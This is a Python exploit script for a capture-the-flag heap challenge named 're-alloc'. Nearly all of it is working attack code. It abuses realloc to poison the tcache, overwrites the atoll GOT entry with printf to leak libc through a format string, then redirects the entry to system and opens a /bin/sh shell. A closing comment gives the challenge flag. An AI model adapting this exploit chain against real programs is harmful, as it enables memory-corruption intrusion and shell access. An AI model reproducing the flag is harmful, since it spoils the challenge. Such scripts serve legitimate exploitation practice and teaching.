#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./re-alloc_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
b *0x4013F1
b *0x40155C
b *0x401632
b *0x40129D
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, aslr=False)

def alloc(idx, size, data):
    slna(b': ', 1)
    slna(b':', idx)
    slna(b':', size)
    sa(b':', data)

def realloc(idx, size, data):
    slna(b': ', 2)
    slna(b':',idx)
    slna(b':', size)
    sa(b':', data)

def realloc_free(idx):
    slna(b': ', 2)
    slna(b':',idx)
    slna(b':', b'0')

def rfree(idx):
    slna(b': ', 3)
    slna(b':', idx)

# ==================== EXPLOIT ====================

# realloc(ptr, 0) --> free(ptr)
# realloc(0, size) --> malloc(size)
# realloc(ptr, size) --> expand/shrink, do nothing if same size

p = start()

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

alloc(0, 0x18, b'0')
realloc_free(0)
realloc(0, 0x18, p64(exe.got.atoll))
alloc(1, 0x18, b'1')

# Reset index 1
realloc(1, 0x28, b'1')
rfree(1)

realloc(0, 0x28, p64(exe.got.atoll))
alloc(1, 0x28, b'1')

# Reset index 0, 1
realloc(0, 64, b'0')
rfree(0)
realloc(1, 120, b'1')
rfree(1)

alloc(0, 0x20, p64(exe.plt.printf))

slna(b': ', 1)
sla(b':', b'%6$p')

libc.address = hexleak(rl()[:-1]) - 0x1e5760
success('libc base @ %#x', libc.address)

# printf return total bytes it print
sla(b'choice: ', b'1')
sa(b'Index:', b'A')
sa(b':',  b'A'*0x8 + b'\0')
sa(b':',  p64(libc.sym.system))

sla(b'choice: ', b'1')
s(b'/bin/sh\0')

interactive()
# FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
